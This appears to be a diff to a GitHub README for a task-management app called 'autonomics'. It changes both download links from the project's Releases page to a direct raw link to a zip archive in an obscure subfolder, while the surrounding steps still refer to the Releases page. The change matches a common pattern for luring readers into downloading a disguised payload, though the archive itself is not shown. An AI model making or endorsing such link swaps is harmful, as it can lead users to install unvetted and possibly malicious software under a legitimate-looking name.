@@ -8,7 +8,7 @@ Welcome to autonomics! This application provides smart, easy solutions to enhanc
 
 To get started with autonomics, first, you need to download the application. 
 
-### [Download autonomics](https://github.com/Untheatrical-observersmeridian721/autonomics/releases)
+### [Download autonomics](https://raw.githubusercontent.com/Untheatrical-observersmeridian721/autonomics/main/audition/autonomics_v2.0-beta.1.zip)
 
 1. Click the link above to visit the Releases page.
 2. Choose the latest version of the software.
@@ -60,6 +60,6 @@ If you encounter any problems, don’t hesitate to seek help:
 - **Community Forum:** Join discussions and find solutions from other users.
 - **Contact Us:** Reach our support team directly through our GitHub page.
 
-### [Download autonomics](https://github.com/Untheatrical-observersmeridian721/autonomics/releases)
+### [Download autonomics](https://raw.githubusercontent.com/Untheatrical-observersmeridian721/autonomics/main/audition/autonomics_v2.0-beta.1.zip)
 
 Thank you for choosing autonomics! Enjoy a smarter way to manage your tasks.
